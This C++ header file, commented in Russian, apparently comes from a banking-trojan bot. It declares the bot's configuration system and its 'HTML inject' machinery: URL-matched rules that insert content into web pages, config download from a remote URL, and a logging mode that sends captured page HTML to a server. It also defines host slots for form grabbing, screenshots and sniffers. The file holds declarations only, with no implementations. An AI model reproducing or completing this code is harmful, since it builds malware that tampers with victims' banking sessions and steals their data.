// -----------------------------------------------------------------------------

#ifndef BotConfigH
#define BotConfigH

// В дальнейшем планируется разделение инжектов от конфига, нро в
// данный момент включение/отключение HTKL инжектов оставляем в этом модуле
#define HTMLInjectsH

// -----------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"
#include "Requests.h"
#include "BotClasses.h"
#include "Requests.h"


#define VERB_IS_POST hmGET
#define VERB_IS_GET  hmPOST

#define MAX_POST_DATA_SIZE 5000
#define MIN_POST_DATA_SIZE 5



#define FGRHOSTFROMCFG		1
#define GRAHOSTFROMCFG		2
#define SCRHOSTFROMCFG		3
#define SNIHOSTFROMCFG		4
#define PLUGINSHOSTFROMCFG	5


const static char ConfigSignature[] = {'B', 'J', 'B', 0};

DWORD GetConfigTimeOut();
char* GetCurrentHostFromConfig(int Num);
void GetCurrentConfigHostSetings(bool*http, bool*https);


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//
//  Методы для работы с конфигурационным файлом бота
//
//
//  ВАЖНО!!!!!! Некоторые опции конфига доступны только для визуальных
//              приложений
//				добавить имя BV_APP в имена препроцесора
//
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



/*
enum TInjectDataState {idsUnknown, idsOk, idsError};

typedef struct THTMLInjectData
{
	PCHAR Before;
	PCHAR Inject;
	PCHAR After;
	TInjectDataState State;
    DWORD MacrosHash;  // Хэш данных  для определения макроса инжекта
	bool Disabled;     // Не использовать инжект (Для отладочной программы)
	LPVOID Owner;      // Указатель на инжект владелец данных
	DWORD  ID;         // Ижентификатор, Для внутренних нужд

}*PHTMLInjectData;

*/



class THTMLInjectList;
class THTMLInject;
class THTMLInjectData;



//---------------------------------------------
//  THTMLInjectList - Список HTML инжектов
//---------------------------------------------
class THTMLInjectList :  public TEventContainer
{
private:
	PList FInjects;

	friend class THTMLInject;
public:
	THTMLInjectList();
	~THTMLInjectList();

	inline DWORD Count() const { return List::Count(FInjects); };
	inline THTMLInject* Items(int Index) const { return (THTMLInject*)List::GetItem(FInjects, Index); }
	inline THTMLInject* operator[](int Index) const { return Items(Index);};
	THTMLInject* AddInject();
	void ResetInjectsStatus();
	void Clear();
};


//---------------------------------------------
//  THTMLInject - HTML инжект
//---------------------------------------------
class THTMLInject : public TEventContainer
{
private:
    THTMLInjectList *FOwner;
	PList  FInjects;   // Список инжектов (список элементов типа PHTMLInject)
	friend class THTMLInjectData;
public:
	string URL;       // Маска сайта для которого необходимо обрабатывать страницы
	bool   GET; 		 // Обрабатывать GET запросы
	bool   POST;       // Обрабатывать POST запросы
	bool   IsLog;      // Логировать HTML. Вместо подмены отправлять данные на сервер
	bool   Disabled;   // Не использовать инжект (Для отладочной программы)
	bool   Used;       // Признак того что маска использовалась
	DWORD  RefCount;  // Количество текущих блокировок инжекта
	bool   DestroyAfterRelease; // Уничтожить инжект после обнуления счётчика
	DWORD  ID;         // Ижентификатор, Для внутренних нужд
	string Comment;   // Коментарий к инжекту, только для редактора

	THTMLInject(THTMLInjectList *aOwner);
	~THTMLInject();

	THTMLInjectData* AddData();
	inline int Count() {return List::Count(FInjects);}
	inline THTMLInjectData* Items(int Index) const {return (THTMLInjectData*)List::GetItem(FInjects, Index);}
	inline THTMLInjectData* operator[](int Index) const { return Items(Index); };
	void Clear();
};


//---------------------------------------------
//  THTMLInjectData - данные HTML инжекта
//---------------------------------------------
enum TInjectDataState {idsUnknown, idsOk, idsError};


class THTMLInjectData : public TEventContainer
{
private:
	THTMLInject* FOwner;
protected:

public:
	string Before;
	string Inject;
	string After;
    DWORD  ID;         // Ижентификатор
	TInjectDataState State;
    DWORD MacrosHash;  // Хэш данных  для определения макроса инжекта
	bool Disabled;     // Не использовать инжект (Для отладочной программы)

	THTMLInjectData(THTMLInject *aOwner);
	~THTMLInjectData();

	inline THTMLInject* Owner() {return FOwner;}
	void Copy(const THTMLInjectData &Data);

	bool IsValid();
};



//---------------------------------------------------------
// TBotConfig -  Настройки работы бота
//---------------------------------------------------------
typedef struct TBotConfig_
{
	THTMLInjectList *HTMLInjects;  // Список инжектов (список элементов типа PHTMLInject)
	RTL_CRITICAL_SECTION Lock;  // Критичиская секция блокировки конфига
	PWCHAR LastConfigFile;      // Имя последнего загруженного файла
	FILETIME ConfigTime;        // Время изменения загруженного файла
} *PBotConfig;



//*********************************************************
//  SetHTMLInjectEvent - установить метод обработки
//		событий HTML инжекта
//*********************************************************
// Метод, событие HTML инжекта
#ifdef BV_APP
	enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
	typedef void(*THTMLInjectEvent)(LPVOID Data,        	// Данныве с которыми зарегистрировано событие
									LPVOID Sender, 	    	// источник события
									THTMLInjectEventID ID,  // Идентификатор события
									LPVOID Reserver);      	// Зарезервировано

	void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);
#endif

namespace Config
{
	// Функция создаёт структуру конфига
	PBotConfig Create();

	// Функция уничтожает структуру конфига
	void Free(PBotConfig Cfg);

	//*********************************************************
	//	Initialize - Инициализировать глобальные
	//  	настройки бота. Если указао имя файла FileName то
	//  	настройки будут прочитаны из него, в противном
	//  	случае настройки будут прочитаны из файла вшитого
	//		в код бота.
	//*********************************************************
	PBotConfig Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad);

	// Функция возвращает указатель на конфиг бота
	PBotConfig GetConfig();

	// Очистить конфиг
	void Clear(PBotConfig Config);

	//  Функция возврашает имя файла по умолчанию
	//
	PWCHAR GetFileName(bool HightPriority = false);

	//  Функция устанавливает имя файла по умолчанию
	void SetFileName(PWCHAR FileName);

	// Загрузить конфиг
	bool Download(PCHAR URL);

	// Функция возвращает истину если буфер является конфигом
    bool IsConfig(PCHAR Buf);

	//  GetInjectsForRequest - Получить инжекты для запроса
	bool GetInjectsForRequest(PRequest Request);

	// Функция проверяет есть ли для указанного адреса инжект
	bool IsInjectURL(PCHAR URL, THTTPMethod Method);

	// Функция загружает конфиг из файла
	bool LoadConfigFromFile(PBotConfig Config, PWCHAR FileName);
}


// HTML_INJECT_MACROS - HIM

#define HIM_REPLACE_DOCUMENT 0x6A665EA5 /* $REPLACE_DOCUMENT$ */


//****************************************************************************
//	HTMLInjects - Методы для работы с HTML инжектами
//****************************************************************************
namespace HTMLInjects
{

	//*********************************************************
	//  Выполнить HTML инжекты.
	//
	//  Результат - функция возвращает истину если в буффер
	//              запроса были внесены изменения
	//*********************************************************
	bool Execute(PRequest Request, PHTTPSessionInfo Session);

	//*********************************************************
	// Функция возвращает истину если указанный тип контента
	// поддерживается методами инжекта HTML
	//*********************************************************
	bool SupportContentType(PCHAR CType);

	//*********************************************************
	//  Методы уничтожения данных HTML инжекта
	//*********************************************************
	void FreeInject(THTMLInject *Inject);

	//*********************************************************
	// ReleaseInjectsList - Фуекция освобождает список инжектов
	//                      которые были выделены для запроса
	// List - Список выделенных инжектов
	//*********************************************************
    void ReleaseInjectsList(PList List);
}

// -----------------------------------------------------------------------------
#endif
